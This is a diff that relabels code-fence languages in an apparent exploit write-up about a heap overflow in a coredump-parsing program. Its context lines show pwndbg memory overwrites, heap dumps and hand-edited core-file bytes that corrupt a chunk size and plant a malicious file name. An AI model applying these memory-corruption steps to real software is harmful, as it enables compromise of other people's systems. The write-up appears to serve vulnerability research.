@@ -492,7 +492,7 @@ $1 = 0x562592378e00
 pwndbg> set {long}(0x562592378e00+0x10)=0xdeadbeefcafebabe # overwrite the memory
 ```
 3. Compare memory before and after calling constructor
-```python
+```telescope
 # step until std::optional constructor is called
 pwndbg> x/10xg 0x562592378df0
 0x562592378df0:	0x000000006f732e31	0x00000000000000d1 # beginning of Backtrace object
@@ -570,7 +570,7 @@ It's time to implement steps from idea in order to successfully exploit the vuln
 
 #### Heap overflow
 
-```python
+```telescope
 0x5647a04a5620:	0x0000000000000000	0x0000000000000101 ===> allocated buffer
 0x5647a04a5630:	0x000055cf2f7b8000	0x000055cf2f7b9000
 0x5647a04a5640:	0x000055cf2f7ba000	0x000055cf2f7bb000
@@ -635,7 +635,7 @@ I opened the _coredump_ file in `nvim` using command: `$ nvim -b core` and `:%!x
 
 It was quite easy to find the correct offset:
 
-```python
+```hexdump
 00000d60: 0000 0000 0000 0000 0500 0000 7108 0000  ............q...
                                          ============== size
                                         \/
@@ -646,7 +646,7 @@ It was quite easy to find the correct offset:
 and replace the value with `0x2000000000000020`.
 To save the file in `nvim` we have to execute `:%!xxd -r` and `:w` to write the file.
 
-```python
+```hexdump
 00000d60: 0000 0000 0000 0000 0500 0000 7108 0000  ............q...
                                         ===============================\
                                         \___ ____                       \ size
@@ -835,7 +835,7 @@ because the offset between next values to zero-out is `0x18 * 0x3 = 0x48`
 2. Find register which is placed at the correct offset and set it's value to valid address from _coredump_ perspective that will be then translated to valid address.
 In my case it was `R14` which was at offset `0x8` (so `registers[1]`). It was pointing at offset `0x40000`:
 
-```python
+```telescope
 0x55c516ae1800:	0x696c2f756e672d78	0x0000000000000121 ===> MappedRegisterSet
 0x55c516ae1810:	0x000055c516073ac8	0x00007fe9b008f994
 0x55c516ae1820:	0x0000000000000150	0x0000000000000000
@@ -862,7 +862,7 @@ LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
 
 3. Overwrite the memory at offset+0x10 to the malicious `Binary::fileName`
 
-```python
+```hexdump
 00040000: 902b aca3 fc7e 0000 b0c4 9ba3 fc7e 0000  .+...~.......~..
 00040010: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
 00040020: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA
